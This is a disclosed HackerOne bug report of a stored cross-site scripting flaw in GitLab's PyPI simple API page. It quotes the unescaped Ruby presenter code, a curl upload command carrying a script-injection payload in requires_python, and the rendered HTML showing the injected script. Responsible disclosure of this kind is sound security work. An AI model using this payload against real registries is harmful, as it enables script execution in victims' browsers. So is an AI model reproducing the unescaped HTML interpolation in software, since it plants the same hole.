# Stored XSS on PyPi simple API endpoint

## Report Details
- **Report ID**: 856836
- **URL**: https://hackerone.com/reports/856836
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-23T04:29:54.270Z
- **Disclosed**: 2020-09-09T21:57:22.001Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
The recently released PyPi package feature has a new endpoint at `/api/:version/projects/:id/packages/pypi/simple/*package_name` which exposes an HTML page listing the package versions. The `package_link`'s are generated using the following code:

[package_presenter.rb#L50](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/presenters/packages/pypi/package_presenter.rb#L50)

```ruby
      def package_link(url, required_python, filename)
        "<a href=\"#{url}\" data-requires-python=\"#{required_python}\">#{filename}</a><br>"
      end
```

The only sanitation on `required_python` is that it is less than 50 characters (db constraint), otherwise arbitrary html can be injected.
### Steps to reproduce

1. Create project
1. Create a pypi package with `requires_python='"><script>alert(1)</script>'`

    ```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
    ````
1. Visit the simple api endpoint and see the injected code: https://gitlab.com/api/v4/projects/18315917/packages/pypi/simple/package_test_1

    ```html
        <!DOCTYPE html>
        <html>
          <head>
            <title>Links for package_test_1</title>
          </head>
          <body>
            <h1>Links for package_test_1</h1>
            <a href="https://gitlab.com/api/v4/projects/18315917/packages/pypi/files/lala.txt#sha256=" data-requires-python=""><script>alert(1)</script>">lala.txt</a><br>
          </body>
        </html>
    ```

Currently will be blocked by the csp on gitlab.com

### Impact
* An attacker could execute arbitrary javascript by sending a user or getting them to click on a url to the simple api endpoint 

### Examples
* https://gitlab.com/api/v4/projects/18315917/packages/pypi/simple/package_test_1

### What is the current *bug* behavior?
The user supplied fields used by the `package_presenter` are not all sanitized

### What is the expected *correct* behavior?
All of the user supplied fields in `package_presenter` should be sanitized before being turned into html

### Output of checks
This bug happens on GitLab.com

## Impact

* An attacker could execute arbitrary javascript by sending a user or getting them to click on a url to the simple api endpoint

## Attachments
No attachments
